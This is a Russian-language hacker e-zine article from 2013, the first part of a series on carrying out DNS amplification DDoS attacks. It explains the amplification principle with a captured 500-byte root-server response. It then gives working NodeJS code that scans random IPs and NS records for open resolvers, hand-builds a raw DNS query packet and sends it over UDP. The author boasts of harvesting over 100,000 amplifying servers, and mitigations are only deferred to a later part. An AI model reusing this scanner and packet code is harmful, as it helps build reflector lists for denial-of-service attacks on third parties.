<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<META http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<link rel="stylesheet" type="text/css" href="style/style.css">
		<title> DNS-Amplification на практике, часть 0 </title>
	</head>

	<body>
	<table cellpadding="25" align="center" >
			<tr>
				<td>
					<h2><span class="header">DNS-Amplification на практике, часть 0</span></h2>
					<br>
					<p class="text">Старая добрая тема <span class="warning">DNS-усиления</span> (она же <span class="warning">DNS-Amplification</span>).
Те, кто знает, что это такое, могут пропустить абзац или вообще не читать тут ничего.</p>
					<p class="text">Принцип атаки крайне прост. Каждый <span class="warning">НС сервер</span> ответит любому, кто его (ДНС) о чем-то спросит.
Если в пакете запроса стоит IP-адрес того, кто, как нам думается, наиболее удостоен ответа,
ДНС-сервер отправит пакет именно ему.</p>
					<p class="text">Весь смысл усиления - добиться как можно большего отношения
размера отправленного ДНС-серверу пакета к размеру пакета, которым ДНС сервер ответит.
Самый избитый метод на этом поприще - попросить ДНС <span class="warning">резолвнуть домен "."</span> - в ответ на это ДНС пришлет массивный
пакет, в котором,  как правило, несколько записей корневых ДНС. Выглядит этот ответ примерно так :</p>

<PRE>
length 540
    209.160.35.110.domain   46.4.179.132.50723: [udp sum ok] 3- q: AAAA? . 0/13/14 
    ns: 
     . NS f.root-servers.net., 
     . NS g.root-servers.net., 
     . NS h.root-servers.net., 
     . NS i.root-servers.net., 
     . NS j.root-servers.net., 
     . NS k.root-servers.net., 
     . NS l.root-servers.net., 
     . NS m.root-servers.net., 
     . NS a.root-servers.net., 
     . NS b.root-servers.net., 
     . NS c.root-servers.net., 
     . NS d.root-servers.net., 
     . NS e.root-servers.net. 
 ar: 
  a.root-servers.net. A 198.41.0.4, 
  a.root-servers.net. AAAA 2001:503:ba3e::2:30, 
  b.root-servers.net. A 192.228.79.201, 
  c.root-servers.net. A 192.33.4.12, 
  d.root-servers.net. A 199.7.91.13, 
  d.root-servers.net. AAAA 2001:500:2d::d, 
  e.root-servers.net. A 192.203.230.10, 
  f.root-servers.net. A 192.5.5.241, 
  f.root-servers.net. AAAA 2001:500:2f::f, 
  g.root-servers.net. A 192.112.36.4, 
  h.root-servers.net. A 128.63.2.53, 
  h.root-servers.net. AAAA 2001:500:1::803f:235, 
  i.root-servers.net. A 192.36.148.17, 
  i.root-servers.net. AAAA 2001:7fe::53 

 (512)
</PRE>
					<p class="text">Как видно, ответ аж 500+ байт. Это очень много, учитывая, что запрос составлял всего 17 (без учета IP\UDP хедеров).
Для нормальной атаки необходимо набрать таких серверов, ответ от которых на наш запрос будет как можно более большим.
Таких ДНС-серверов не так много как кажется, так как атака стара как мир и есть множество готовых решений для предотвращения
подобной эксплуатации, о которых будет написано в конце.</p><br>

					<h3><span class="warning">Поиск уязвимых серверов</span></h3>
					<p class="text">Для этих целей понадобится сервер с хорошим каналом и лояльное отношение хостера к хорошему потоку исходящего UDP. Производить
сканирование лучше всего с помощью быстрого кода, написанного на нативных языках. Я использовал <span class="warning">NodeJS</span>, так как лаги резолва 
покрывают временные затраты на выполнение кода. Если не будет хватать производительности, ноду можно запустить в режиме cluster
с использованием over9000 чайлдов. Идея простая - надо слать пакеты и смотреть ответы. Пакеты можно слать как на рандомный хост</p>

<PRE>
var ip = [rand(255), rand(255), rand(255), rand(255)].join('.')
sendPacket(ip);
</PRE>

					<p class="text">так и выбирая хосты более обдуманно. Для более быстрого сканирования, целесообразно заиметь как можно более широкий список уже существующих
ДНС серверов. Для этого необходим список  совершенно любых доменов, главное чтоб их было много (больше 1-2млн как минимум). Из списка берется
один домен, для него запрашивается <span class="warning">запись NS</span>. В ответе на NS будет список ДНС серверов, обслуживающих этот домен.
Вот их и добавляем в список тестируемых. </p>



<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
dns.<span style="color: #660066;">resolveNs</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'google.com'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span> <span style="color: #009900;">&#40;</span>err<span style="color: #339933;">,</span> addresses<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
 <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span>err<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
  addresses.<span style="color: #660066;">forEach</span><span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">function</span> <span style="color: #009900;">&#40;</span>a<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
   sendPacket<span style="color: #009900;">&#40;</span>a<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
  <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 <span style="color: #009900;">&#125;</span>
<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>



					<p class="text">Теперь самое интересное - отправляем ДНС пакет. На деле все проще чем кажется.
Статичный пакет ДНС-запроса, который будет отправляться по UDP нужному серверу:</p>



<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> ns_packet <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">new</span> Buffer<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>
    <span style="color: #006600; font-style: italic;">//---- стандартный заголовок -----</span>
    0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Айди запроса </span>
    0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Флаги</span>
    0x00<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число запросов : 1</span>
    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число ответов : 0 </span>
    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число авторизованных записей</span>
    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число дополнительных записей</span>
    <span style="color: #006600; font-style: italic;">//---- тело запроса -----</span>
    <span style="color: #006600; font-style: italic;">// запись АААА для &quot;.&quot;</span>
    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
    0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 
    0x01
<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>



					<p class="text">Код отправки:</p> 
					
					
					
<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> client <span style="color: #339933;">=</span> dgram.<span style="color: #660066;">createSocket</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'udp4'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #003366; font-weight: bold;">function</span> sendPacket<span style="color: #009900;">&#40;</span>ip<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
 client.<span style="color: #660066;">send</span><span style="color: #009900;">&#40;</span>ns_packet<span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">,</span> ns_packet.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">53</span><span style="color: #339933;">,</span> ip<span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>err<span style="color: #339933;">,</span> bytes<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'sent %d bytes'</span><span style="color: #339933;">,</span> bytes<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
&nbsp;
client.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'error'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
 console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'client error'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
client.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'message'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
 <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span>msg.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
  console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;%d bytes from %s:%d&quot;</span><span style="color: #339933;">,</span> 
   msg.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">address</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">port</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 <span style="color: #009900;">&#125;</span>
<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>



					<p class="text">Таким образом, удалось собрать более 100к серверов, отвечающих пакетами в полкилобайта, за несколько часов.</p> <br>
					
					<p class="warning"><a href="dnsa_1.html">Часть 1 >>></a></p> 
					

<p class="warning"><br>______________________________<br>
MZh<br>
2013<br><br>
Inception E-Zine</p>

				</td>
			</tr>
		</table>
	</body>
</html>